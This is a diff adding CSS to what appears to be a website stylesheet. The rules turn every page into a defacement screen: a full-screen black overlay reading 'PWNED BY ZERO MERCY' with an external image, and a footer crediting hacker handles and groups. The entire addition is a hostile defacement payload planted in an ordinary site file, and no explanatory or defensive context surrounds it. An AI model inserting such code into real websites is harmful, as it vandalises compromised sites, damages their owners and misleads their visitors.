@@ -1,0 +1,30 @@
+body::before {
+    content: 'PWNED BY ZERO MERCY';
+    position: fixed;
+    inset: 0;
+    background: #000 url('https://i.imgur.com/XNerXsx.png') center/cover;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: monospace;
+    font-size: 3em;
+    color: #fff;
+    text-shadow: 0 0 20px rgba(255, 255, 255, .5);
+    letter-spacing: 6px;
+    text-transform: uppercase;
+    z-index: 99999;
+    flex-direction: column
+}
+
+body::after {
+    content: 'GZ: p4nch0 – Grexx – S3ph – 0xh2x – bithub – bxbyr3dd – pxminta – t0ky0w| GREETZ: TRAPGNG 1LUV ARCSENDO TIMOG';
+    position: fixed;
+    bottom: 20px;
+    left: 0;
+    right: 0;
+    text-align: center;
+    font-family: monospace;
+    font-size: .85em;
+    color: #aaa;
+    z-index: 99999
+}
